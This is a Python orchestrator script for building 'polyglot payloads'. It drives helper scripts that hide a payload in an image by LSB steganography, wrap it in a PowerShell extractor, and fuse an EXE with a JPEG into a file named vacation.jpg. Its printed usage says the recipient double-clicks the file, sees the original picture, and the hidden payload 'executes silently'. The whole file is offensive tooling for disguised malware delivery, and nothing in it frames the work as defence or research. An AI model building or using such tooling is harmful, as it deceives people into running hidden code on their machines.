"""
MASTER ORCHESTRATOR - Modular workflow for creating polyglot payloads
Chains together all phases with proper parameter passing and validation
"""

import os
import sys
import json
import argparse
import subprocess
from pathlib import Path


class PolyglotOrchestrator:
    """Orchestrates the complete polyglot creation workflow"""
    
    def __init__(self, verbose=True):
        self.verbose = verbose
        self.script_dir = Path(__file__).parent
        self.temp_files = []
    
    def log(self, message, level="INFO"):
        if self.verbose:
            prefix = f"[{level}]" if level != "INFO" else "[ORCH]"
            print(f"{prefix} {message}")
    
    def create_polyglot(self, original_image, payload_script, output_file="vacation.jpg"):
        """
        Complete workflow to create polyglot:
        Phase 1: Steganography - Hide payload in image (LSB)
        Phase 2: Build Extractor - Create PowerShell wrapper with embedded image
        Phase 3: Create Polyglot - Combine EXE + JPEG
        
        Args:
            original_image: Path to cover image (JPEG/PNG)
            payload_script: Path to script/executable to hide
            output_file: Output polyglot filename
        
        Returns:
            bool: Success status
        """
        
        print("\n" + "=" * 70)
        print("POLYGLOT PAYLOAD CREATION WORKFLOW")
        print("=" * 70)
        
        # Validate inputs
        if not os.path.exists(original_image):
            self.log(f"Image not found: {original_image}", "ERROR")
            return False
        
        if not os.path.exists(payload_script):
            self.log(f"Payload not found: {payload_script}", "ERROR")
            return False
        
        # Check image capacity upfront
        self.log("-" * 70)
        self.log("Checking image capacity...", "PHASE")
        payload_size = os.path.getsize(payload_script)
        capacity = self._check_capacity(original_image)
        
        if capacity is None:
            self.log("Failed to check capacity", "ERROR")
            return False
        
        self.log(f"Payload size: {payload_size} bytes")
        self.log(f"Image capacity: {capacity} bytes")
        
        if payload_size > capacity:
            self.log(f"Payload too large! Need {payload_size - capacity} more bytes", "ERROR")
            return False
        
        # Setup temporary files
        temp_hidden_image = "temp_image_hidden.png"
        temp_metadata = "temp_metadata.json"
        temp_final_script = "temp_final_payload.ps1"
        
        self.temp_files = [temp_hidden_image, temp_metadata, temp_final_script]
        
        try:
            # PHASE 1: LSB Steganography
            self.log("-" * 70)
            self.log("PHASE 1: LSB Steganography", "PHASE")
            self.log("-" * 70)
            self.log(f"Image: {original_image}")
            self.log(f"Payload: {payload_script}")
            
            if not self._phase_steganography(original_image, payload_script, 
                                            temp_hidden_image, temp_metadata):
                self.log("Phase 1 failed!", "ERROR")
                return False
            
            self.log(f"✓ Hidden image: {temp_hidden_image}", "SUCCESS")
            self.log(f"✓ Metadata: {temp_metadata}", "SUCCESS")
            
            # PHASE 2: Build Extractor
            self.log("-" * 70)
            self.log("PHASE 2: Build Extractor Wrapper", "PHASE")
            self.log("-" * 70)
            
            if not self._phase_build_extractor(temp_metadata, temp_hidden_image, 
                                              temp_final_script):
                self.log("Phase 2 failed!", "ERROR")
                return False
            
            self.log(f"✓ Extractor wrapper: {temp_final_script}", "SUCCESS")
            
            # PHASE 3: Create Polyglot
            self.log("-" * 70)
            self.log("PHASE 3: Create Polyglot", "PHASE")
            self.log("-" * 70)
            
            if not self._phase_create_polyglot(temp_final_script, original_image, 
                                              output_file):
                self.log("Phase 3 failed!", "ERROR")
                return False
            
            # Success!
            print("\n" + "=" * 70)
            print("✓ POLYGLOT CREATION SUCCESSFUL!")
            print("=" * 70)
            self.log(f"Output: {output_file}")
            self.log(f"Size: {os.path.getsize(output_file)} bytes")
            print("\nUsage:")
            print(f"  1. Rename to an image extension (or leave as .jpg)")
            print(f"  2. Double-click {output_file}")
            print(f"  3. Original image displays")
            print(f"  4. Hidden payload executes silently")
            
            return True
        
        except Exception as e:
            self.log(f"Workflow error: {e}", "ERROR")
            import traceback
            traceback.print_exc()
            return False
        
        finally:
            # Cleanup
            self._cleanup_temps()
    
    def _check_capacity(self, image_path):
        """Check image capacity using steganography.py"""
        try:
            result = subprocess.run([
                sys.executable,
                str(self.script_dir / 'steganography.py'),
                '--mode', 'capacity',
                '--image', image_path,
                '--quiet'
            ], capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0 and 'capacity' in result.stdout.lower():
                # Parse "Image capacity: XXXX bytes"
                parts = result.stdout.split(':')
                if len(parts) >= 2:
                    capacity_str = parts[-1].strip().split()[0]
                    return int(capacity_str)
            
            return None
        except Exception as e:
            self.log(f"Capacity check failed: {e}", "ERROR")
            return None
    
    def _phase_steganography(self, image_path, payload_path, hidden_image_path, 
                            metadata_path):
        """PHASE 1: Hide payload in image using LSB steganography"""
        try:
            self.log("Embedding payload into image...")
            
            result = subprocess.run([
                sys.executable,
                str(self.script_dir / 'steganography.py'),
                '--mode', 'embed',
                '--image', image_path,
                '--data', payload_path,
                '--output', hidden_image_path
            ], capture_output=True, text=True, timeout=60)
            
            if result.returncode != 0:
                self.log(f"Steganography error: {result.stderr}", "ERROR")
                return False
            
            # Metadata should be auto-generated
            metadata_auto = hidden_image_path.replace('.png', '') + '_metadata.json'
            if os.path.exists(metadata_auto):
                if os.path.exists(metadata_path):
                    os.remove(metadata_path)
                os.rename(metadata_auto, metadata_path)
            
            return os.path.exists(hidden_image_path) and os.path.exists(metadata_path)
        
        except Exception as e:
            self.log(f"Steganography failed: {e}", "ERROR")
            return False
    
    def _phase_build_extractor(self, metadata_path, hidden_image_path, 
                               output_script_path):
        """PHASE 2: Build PowerShell wrapper with embedded image"""
        try:
            self.log("Building extractor wrapper...")
            
            result = subprocess.run([
                sys.executable,
                str(self.script_dir / 'build_extractor.py'),
                '--metadata', metadata_path,
                '--image', hidden_image_path,
                '--output', output_script_path
            ], capture_output=True, text=True, timeout=60)
            
            if result.returncode != 0:
                self.log(f"Extractor build error: {result.stderr}", "ERROR")
                return False
            
            self.log(f"Build output: {result.stdout.strip()}")
            return os.path.exists(output_script_path)
        
        except Exception as e:
            self.log(f"Extractor build failed: {e}", "ERROR")
            return False
    
    def _phase_create_polyglot(self, script_path, image_path, output_path):
        """PHASE 3: Create polyglot by combining EXE + JPEG"""
        try:
            self.log("Creating polyglot file...")
            
            result = subprocess.run([
                sys.executable,
                str(self.script_dir / 'create_polyglot.py'),
                '--script', script_path,
                '--image', image_path,
                '--output', output_path
            ], capture_output=True, text=True, timeout=120)
            
            if result.returncode != 0:
                self.log(f"Polyglot creation error: {result.stderr}", "ERROR")
                return False
            
            self.log(f"Create output: {result.stdout.strip()}")
            return os.path.exists(output_path)
        
        except Exception as e:
            self.log(f"Polyglot creation failed: {e}", "ERROR")
            return False
    
    def _cleanup_temps(self):
        """Clean up temporary files"""
        self.log("\nCleaning up...", "DEBUG")
        for temp_file in self.temp_files:
            try:
                if os.path.exists(temp_file):
                    os.remove(temp_file)
                    self.log(f"Removed: {temp_file}", "DEBUG")
            except Exception as e:
                self.log(f"Failed to remove {temp_file}: {e}", "WARN")


def main():
    parser = argparse.ArgumentParser(
        description='Create polyglot payloads (EXE + JPEG with hidden LSB payload)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Auto-detect from input/ folder structure
  python orchestrator.py
  
  # Explicit files and output
  python orchestrator.py --image photo.jpg --payload script.ps1 --output vacation.jpg
        '''
    )
    
    parser.add_argument('--image', help='Cover image (JPEG/PNG) - optional with auto-detect')
    parser.add_argument('--payload', help='Payload to hide - optional with auto-detect')
    parser.add_argument('--output', default='output/vacation.jpg', 
                       help='Output polyglot file (default: output/vacation.jpg)')
    parser.add_argument('--quiet', action='store_true', help='Suppress verbose output')
    
    args = parser.parse_args()
    orch = PolyglotOrchestrator(verbose=not args.quiet)
    
    # Auto-detect if not specified
    image_path = args.image
    payload_path = args.payload
    
    if not image_path or not payload_path:
        orch.log("Auto-detecting input files from input/ folder...")
        try:
            from steganography import LSBSteganography
            carrier, payload = LSBSteganography.find_input_files()
            if not image_path:
                image_path = str(carrier)
                orch.log(f"  Carrier: {image_path}")
            if not payload_path:
                payload_path = str(payload)
                orch.log(f"  Payload: {payload_path}")
        except Exception as e:
            orch.log(f"Auto-detect failed: {e}", "ERROR")
            orch.log("Use --image and --payload to specify files explicitly", "WARN")
            sys.exit(1)
    
    # Create output directory if needed
    os.makedirs(os.path.dirname(args.output) or '.', exist_ok=True)
    
    success = orch.create_polyglot(
        original_image=image_path,
        payload_script=payload_path,
        output_file=args.output
    )
    
    sys.exit(0 if success else 1)


if __name__ == '__main__':
    main()
